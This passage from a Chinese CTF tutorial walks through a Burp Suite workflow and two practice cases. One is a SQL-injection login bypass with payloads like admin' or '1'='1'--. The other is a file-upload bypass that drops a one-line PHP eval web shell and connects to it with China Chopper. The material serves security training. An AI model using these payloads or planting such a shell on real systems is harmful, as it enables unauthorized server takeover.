## 一、模块协同作战

### 1.1 经典工作流

```
Burp Suite标准工作流：

1. Proxy抓包分析
   - 抓取所有请求
   - 分析请求内容
   - 发现可疑点

2. Repeater重放测试
   - 发送可疑请求
   - 修改参数测试
   - 验证漏洞

3. Intruder自动化
   - 确定攻击目标
   - 配置Payload
   - 暴力破解

4. Decoder辅助解码
   - 解码编码数据
   - 编码请求参数
   - 分析加密内容
```

## 二、综合实战案例

### 2.1 案例：SQL注入+暴力破解

```
题目描述：
  登录框存在SQL注入
  需要同时利用注入和爆破

解决步骤：
  1. Proxy抓包
     抓取登录请求
     
  2. 分析发现注入点
     username=admin' or '1'='1
     
  3. Repeater测试注入
     测试多种注入payload
     
  4. 发现万能密码
     admin' or '1'='1'--
     
  5. 登录成功获取Flag
```

### 2.2 案例：文件上传+菜刀连接

```
题目描述：
  存在文件上传漏洞
  需要上传WebShell

解决步骤：
  1. Proxy抓包
     抓取上传请求
     
  2. 修改文件类型
     Content-Type: image/jpeg
     
  3. 上传WebShell
     <?php @eval($_POST['cmd']); ?>
     
  4. Repeater测试访问
     确认上传成功
     
  5. 使用菜刀连接
     获取服务器权限
```
